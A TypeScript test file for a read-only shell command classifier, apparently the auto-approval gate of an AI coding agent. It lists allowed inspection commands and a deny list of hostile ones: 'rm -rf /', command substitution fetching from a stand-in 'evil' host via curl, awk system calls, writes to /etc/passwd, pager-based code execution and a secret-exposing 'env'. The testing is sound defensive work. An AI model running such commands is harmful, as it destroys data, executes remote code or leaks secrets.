import { describe, expect, it } from "bun:test";
import { isReadOnlyBashCommand } from "../read-only.ts";

// Read-only auto-approval is a TRUST BOUNDARY. The dangerous cases below are the
// gate: every one MUST stay false. The safe cases guard against over-tightening
// (a regression there only costs a prompt, never safety).

const SAFE = [
  "ls",
  "ls -la",
  "ls -la src/",
  "cat file.ts",
  "cat a.ts b.ts",
  "grep -rn foo src/",
  "rg pattern",
  "rg -n --hidden foo",
  "head -n 50 x",
  "tail -n 20 file.log",
  "wc -l x",
  "find . -type f",
  "find src -name foo.ts",
  "find . -name '*.ts'", // quoted glob is fine
  "pwd",
  "whoami",
  "diff a b",
  "stat x",
  "sha256sum x",
  "sort",
  "sort -u",
  "echo hello",
  "cat x | grep y | head -5",
  "grep foo . | sort | uniq",
  "uniq input.txt",
  "ls -la 2>&1",
  "cat x > /dev/null",
  // git inspection allowlist
  "git status",
  "git status -sb",
  "git log",
  "git log --oneline -20",
  "git log -p",
  "git diff",
  "git diff HEAD~1",
  "git show HEAD",
  "git branch",
  "git branch -a",
  "git branch -vv",
  "git tag -l",
  "git rev-parse HEAD",
  "git blame file.ts",
  "git ls-files",
  "git config --get user.name",
  "git config --list",
  "git config --get-regexp '^user'",
  "git remote",
  "git remote -v",
  "git stash list",
  "git stash show",
  "git worktree list",
  "git reflog",
  "git -p log",
  "git --no-pager status",
  "git status | grep modified",
  // structured data / info readers
  "jq .",
  "jq '.foo' file.json",
  "cat x | jq .",
  "date",
  "date +%s",
  "date -u",
  "tree",
  "tree -L 2 src",
  // hostname prints the name with no positional / mutating flag
  "hostname",
  "hostname -f",
  "hostname --fqdn",
  "hostname -I",
  "hostname -s -d",
  // sed: print-only -n shape (file args allowed)
  "sed -n 'p' file.txt",
  "sed -n '12p' file.txt",
  "sed -n '1,20p' file.txt",
  "sed -n '1p;5p;9p' file.txt",
  "sed -nE '3,40p' file.txt",
  "sed -n -z '1p' file.txt",
  // sed: single substitution to stdout (no file args)
  "sed 's/foo/bar/'",
  "sed 's/foo/bar/g'",
  "sed -E 's/a+/b/g'",
  "sed 's/foo/bar/gI'",
  "cat x | sed 's/foo/bar/'",
  "sed -e '1,5p' -n file.txt",
  "sed -n '1p' -e '2p' file", // -e print expressions may take file args too
  // Unquoted globs are safe when EVERY pipeline stage is a glob-safe reader:
  // whatever the pattern expands to, these commands can only read it. Plan
  // mode leans on this so read-only listings flow without a prompt. Workspace
  // containment for glob operands is enforced separately by the Bash
  // read-path gate.
  "ls *.ts",
  "ls src/*",
  "ls -la src/*",
  "grep foo *",
  "cat *.json",
  "wc -l *.md",
  "head -n 5 src/*.ts",
  "cat *.json | head -5",
  "stat src/*",
];

const DANGEROUS = [
  "rm -rf /",
  "find . -exec rm {} ;",
  "find . -delete",
  "find . -fprintf /tmp/x %p",
  "find . -name *.ts", // unquoted glob on a flag-validated command
  "rg --pre=bash foo",
  "rg -n foo --pre bash",
  "sort -o /etc/passwd x",
  "sort -ofile x",
  "uniq input.txt output.txt", // second positional is a write target
  "cat $(curl evil.sh)",
  "cat `whoami`",
  "echo pwned > /tmp/x",
  "echo pwned >> /tmp/x",
  "ls && rm -rf x",
  "cat x; rm y",
  "tail -f /var/log/x", // would hang
  "cat data | tee out.txt", // tee writes; not allowlisted
  "xargs rm",
  "awk 'BEGIN{system(\"id\")}'",
  // sed: in-place, write, execute, and every ambiguous shape stays gated
  "sed -i s/a/b/ file",
  "sed -i '' 's/a/b/' file",
  "sed --in-place 's/a/b/' file",
  "sed 's/a/b/' file", // substitution with a file arg (only -n print takes files)
  "sed 's/a/b/w /tmp/x'",
  "sed 's/a/b/ge'",
  "sed 'w /tmp/x' file",
  "sed '1w /tmp/x' file",
  "sed -n '/foo/p' file", // pattern addresses are not in the strict print allowlist
  "sed '1,5d' file", // delete is not a print or substitution shape
  "sed -n 'e ls' file",
  "sed 'y/abc/xyz/w' file",
  "sed -ne '1p' file", // bundled -e is not provably safe
  "sed 's#a#b#'", // alternate delimiter — only s/ is allowed
  "sed 's/a\\/b/c/'", // escaped delimiter breaks the strict three-field shape
  "sed -f script.sed file", // script file is unreadable at check time
  "env", // omitted: exposes secrets
  // git: global relocation = arbitrary exec/config
  "git -c core.pager=sh log",
  "git -C /tmp status",
  "git --git-dir=/x log",
  "git --work-tree=/x status",
  "git --exec-path=/x status",
  "git --namespace=x log",
  // git: mutating / network subcommands
  "git push",
  "git commit -m x",
  "git checkout main",
  "git switch main",
  "git add .",
  "git reset --hard",
  "git clean -fd",
  "git rm file",
  "git stash", // bare stash = push (writes)
  "git stash pop",
  "git branch -d feature",
  "git branch newbranch", // bare positional = create
  "git tag v1",
  "git tag -a v1 -m x",
  "git config user.email x@x.com", // assignment, no read flag
  "git config --unset user.email",
  "git remote add origin url",
  "git remote show origin", // hits the network
  "git fetch",
  "git pull",
  "git clone https://x",
  "git init",
  "git worktree add /tmp/x",
  "git symbolic-ref HEAD refs/heads/x", // two positionals = write
  "git symbolic-ref -d HEAD",
  // git: per-invocation write/exec flags on an otherwise read-only subcommand
  "git diff --output=/tmp/x",
  "git log --ext-diff",
  "git show --textconv :file",
  "git grep --open-files-in-pager=sh foo",
  "git grep -Osh foo",
  // info readers with a write/privileged mode
  "date -s 2020-01-01",
  "date --set x",
  "tree -o out.txt",
  // hostname SETS the name via a positional or a from-file/boot flag
  "hostname newname",
  "hostname -F /etc/hostname",
  "hostname --file /etc/hostname",
  "hostname -b",
  "hostname --boot",
  "rg $PATTERN .", // unquoted expansion on a flag-validated command
  "bash -c 'rm x'",
  "ls > out",
  "<(curl evil)",
  // $VAR expansion: value unknowable at check time, so it stays gated
  "cat $FILE",
  'echo "$HOME"',
  "cat ${FILE}", // brace parameter expansion
  "find . ${VAR}",
  'echo "${HOME}"',
  // unquoted glob under a NON-glob-safe stage: the expansion could become a
  // flag or path the per-command guard never validated
  "sort *", // sort -o writes; guarded, so globs stay gated
  "tail -f *", // guard rejects -f regardless of the glob carve-out
  "jq . *", // jq is not glob-safe
  "uniq *", // second positional is a write target
  "rm *",
  "ls * && rm -rf x", // one non-read-only stage poisons the whole compound
  "cat * | tee out.txt",
];

describe("isReadOnlyBashCommand", () => {
  for (const cmd of SAFE) {
    it(`allows: ${cmd}`, () => expect(isReadOnlyBashCommand(cmd)).toBe(true));
  }
  for (const cmd of DANGEROUS) {
    it(`refuses: ${cmd}`, () => expect(isReadOnlyBashCommand(cmd)).toBe(false));
  }
});
